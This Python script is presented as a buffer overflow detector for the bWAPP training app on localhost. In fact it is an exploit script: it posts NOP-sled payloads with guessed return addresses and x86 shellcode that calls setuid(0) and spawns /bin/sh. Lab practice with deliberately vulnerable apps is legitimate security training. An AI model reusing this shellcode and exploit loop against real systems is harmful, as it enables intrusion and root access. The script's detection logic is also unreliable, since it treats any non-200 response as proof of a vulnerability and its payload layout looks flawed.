import requests

def generate_pattern(length):
    pattern = ''
    parts = ['A', 'B', 'C']
    for i in range(length):
        pattern += parts[i % 3]
    return pattern.encode('utf-8')

def detect_buffer_overflow(url):
    base_payload_size = 400
    max_payload_size = 2000
    step = 100
    nop_sled = b"\x90" * 354
    shellcode = (
        b"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
        b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
        b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
        b"\x53\x89\xe1\xb0\x0b\xcd\x80"
    )
    ret_addresses = [b"\x8f\x92\x04\x08", b"\x8e\x92\x04\x08", b"\x90\x92\x04\x08"]  # Trying multiple addresses

    for ret_address in ret_addresses:
        for size in range(base_payload_size, max_payload_size, step):
            if size > 354:
                exploit_string = nop_sled + ret_address + shellcode + b"A" * (size - 354 - len(ret_address) - len(shellcode))
            else:
                exploit_string = generate_pattern(size)
            
            # Prepare the data to be sent in the POST request
            data = {
                'title': exploit_string.decode('latin-1', errors='ignore')  # Ensure correct encoding for binary data
            }

            try:
                # Send the POST request with the payload
                response = requests.post(url, data=data)

                # Check the response for signs of a buffer overflow
                if "Segmentation fault" in response.text or "stack smashing" in response.text:
                    result = {
                        "vulnerable": True,
                        "payload_size": size,
                        "ret_address": ret_address.hex(),
                        "response": response.text[:500]
                    }
                    print("Buffer Overflow vulnerability detected!")
                    return result
                elif response.status_code != 200:
                    result = {
                        "vulnerable": True,
                        "payload_size": size,
                        "ret_address": ret_address.hex(),
                        "response": f"Received HTTP {response.status_code} which may indicate a crash."
                    }
                    print(f"Received HTTP {response.status_code} which may indicate a crash.")
                    return result
            except Exception as e:
                print(f"An error occurred with payload size {size} and return address {ret_address.hex()}: {e}")
                return None
    return None

if __name__ == "__main__":
    # URL of the target web application
    target_url = "http://localhost/bWAPP/bof_1.php"
    # Call the function to detect buffer overflow
    result = detect_buffer_overflow(target_url)
    if result:
        print(result)
